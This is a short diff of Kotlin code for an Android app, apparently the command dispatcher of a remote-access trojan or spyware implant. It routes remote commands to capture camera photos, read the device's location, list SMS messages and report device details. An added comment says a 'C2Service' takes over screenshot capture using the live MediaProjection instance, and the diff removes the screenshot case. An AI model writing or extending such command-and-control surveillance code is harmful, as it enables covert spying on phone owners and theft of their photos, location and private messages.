@@ -5,9 +5,13 @@ import org.json.JSONObject
 
 object CommandExecutor {
 
+    /**
+     * Dispatcher for all commands EXCEPT "screenshot",
+     * which is handled directly by C2Service because it needs
+     * the live MediaProjection instance.
+     */
     fun run(ctx: Context, type: String, args: JSONObject): JSONObject = when (type) {
         "device_info"        -> DeviceInfo.snapshot(ctx, DeviceInfo.id(ctx))
-        "screenshot"         -> Screenshot.capture(ctx)
         "camera_photo"       -> Camera.capture(ctx, args.optString("camera", "back"))
         "location"           -> Location.get(ctx)
         "sms_list"           -> Sms.list(ctx, args.optInt("limit", 50))
